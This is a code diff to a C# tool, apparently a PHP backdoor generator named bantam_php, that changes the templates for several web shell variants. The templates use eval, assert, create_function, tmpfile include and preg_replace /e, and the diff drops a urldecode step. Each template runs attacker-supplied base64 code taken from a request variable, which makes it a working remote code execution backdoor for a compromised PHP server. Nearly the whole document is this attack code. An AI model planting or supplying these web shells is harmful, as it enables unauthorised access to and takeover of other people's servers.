@@ -55,17 +55,17 @@ namespace bantam_php
 
             switch (backdoorType) {
                 case BackdoorTypes.EVAL: {
-                        backdoorResult = "<?php \r\nif(isset($_" + varType + "['" + varName + "'])) {\r\n\t@eval(@urldecode(@base64_decode($_" + varType + "['" + varName + "'])));\r\n}";
+                        backdoorResult = "<?php \r\nif(isset($_" + varType + "['" + varName + "'])) {\r\n\t@eval(@base64_decode($_" + varType + "['" + varName + "']));\r\n}";
                         break;
                     }
 
                 case BackdoorTypes.ASSERT: {
-                        backdoorResult = "<?php \r\nif(isset($_" + varType + "['" + varName + "'])) {\r\n\t@assert(@urldecode(@base64_decode($_" + varType + "['" + varName + "'])));\r\n}";
+                        backdoorResult = "<?php \r\nif(isset($_" + varType + "['" + varName + "'])) {\r\n\t@assert(@base64_decode($_" + varType + "['" + varName + "']));\r\n}";
                         break;
                     }
 
                 case BackdoorTypes.CREATE_FUNCTION: {
-                        backdoorResult = "<?php \r\nif(isset($_" + varType + "['" + varName + "'])) {\r\n\t$a=@create_function(null, @urldecode(@base64_decode($_" + varType + "['" + varName + "'])));\r\n\t$a();\r\n}";
+                        backdoorResult = "<?php \r\nif(isset($_" + varType + "['" + varName + "'])) {\r\n\t$a=@create_function(null, @base64_decode($_" + varType + "['" + varName + "']));\r\n\t$a();\r\n}";
                         break;
                     }
 
@@ -75,12 +75,12 @@ namespace bantam_php
                     }
 
                 case BackdoorTypes.TMP_INCLUDE: {
-                        backdoorResult = "<?php \r\nif(isset($_" + varType + "['" + varName + "'])) {\r\n\t$fp = @tmpfile();\r\n\t$tmpf=@stream_get_meta_data($fp);\r\n\t$tmpf=$tmpf['uri'];\r\n\t@fwrite($fp, '<?php '.@urldecode(@base64_decode($_" + varType + "['" + varName + "'])));\r\n\t@include($tmpf);\r\n\t@fclose($f);\r\n}";
+                        backdoorResult = "<?php \r\nif(isset($_" + varType + "['" + varName + "'])) {\r\n\t$fp = @tmpfile();\r\n\t$tmpf=@stream_get_meta_data($fp);\r\n\t$tmpf=$tmpf['uri'];\r\n\t@fwrite($fp, '<?php '.@base64_decode($_" + varType + "['" + varName + "']));\r\n\t@include($tmpf);\r\n\t@fclose($f);\r\n}";
                         break;
                     }
 
                 case BackdoorTypes.PREG_REPLACE: {
-                        backdoorResult = "<?php \r\nif(isset($_" + varType + "['" + varName + "'])) {\r\n\t@urldecode(@base64_decode(@preg_replace(\"/.*/\x65\", $_" + varType + "['" + varName + "'],'.')));\r\n}";
+                        backdoorResult = "<?php \r\nif(isset($_" + varType + "['" + varName + "'])) {\r\n\t@base64_decode(@preg_replace(\"/.*/\x65\", $_" + varType + "['" + varName + "'],'.'));\r\n}";
                         break;
                     }
             }
